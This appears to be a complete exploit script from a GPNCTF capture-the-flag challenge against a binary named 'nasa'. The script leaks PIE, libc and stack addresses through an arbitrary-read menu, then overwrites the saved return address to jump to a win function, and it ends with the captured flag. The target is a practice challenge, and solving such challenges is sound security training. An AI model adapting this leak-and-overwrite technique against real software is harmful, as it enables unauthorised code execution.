#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./nasa_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

gdbscript = '''
init-pwndbg
# init-gef-bata
# brva 0x1533
# brva 0x1655
brva 0x1705
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "./nasa"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=False)

def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()

# ==================== EXPLOIT ====================
p = start()

# debug()
leak = hexleak(rl()[:-1])
exe.address = hexleak(rl()[:-1]) - exe.sym.win

slog('leak @ %#x', leak)
slog('pie base @ %#x', exe.address)

sla(b't\n', b'2')
sla(b')\n', f'{hex(exe.got.exit)}'.encode())
libc.address = int(b'0x' + rl()[:-1], 16) - libc.sym.exit
slog('libc base @ %#x', libc.address)

sla(b't\n', b'2')
sla(b')\n', f'{hex(libc.sym.environ)}'.encode())
stack_leak = int(b'0x' + rl()[:-1], 16)
saved_rip = stack_leak - 0x130
slog('stack leak @ %#x', stack_leak)
slog('saved RIP @ %#x', saved_rip)

sla(b't\n', b'1')
sla(b')\n', f'{hex(saved_rip)} {hex(exe.sym.win+22)}'.encode())

sla(b't\n', b'3')

interactive()
# GPNCTF{all_WR17es_ARe_Pro7ec7eD_BY_45aN_onlY_in_yoUR_dre4ms_9438}
